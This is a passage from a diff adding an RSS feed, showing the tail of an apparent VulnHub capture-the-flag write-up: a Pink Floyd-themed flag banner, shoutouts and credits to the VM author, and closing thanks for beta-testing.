+  |_|_______|_______|_______|_______ _______&#39;_______|_______|_______|_|
+  |     |       |       |       |       |       |       |       |     |
+  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
+  |_________|_______|_______|_______|_______|_______|_______|_______|_|
+
+                  Celebrating 50 years of Pink Floyd!
+             Syd Barrett (RIP), Nick Mason, Roger Waters,
+               Richard Wright (RIP), and David Gilmour.
+
+
+** Shoutouts **
++ @vulnhub for making it all possible
++ @rastamouse @thecolonial - &amp;quot;the test bunnies&amp;quot;
+
+-=========================================-
+-  xerubus (@xerubus - www.mogozobo.com)  -
+-=========================================-
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It was also nice to read through the contents of &lt;code&gt;/root/scripts/&lt;/code&gt; to see how the VM works.&lt;/p&gt;
+
+&lt;p&gt;Many thanks to xerubus, and thanks for letting me beta-test :)&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
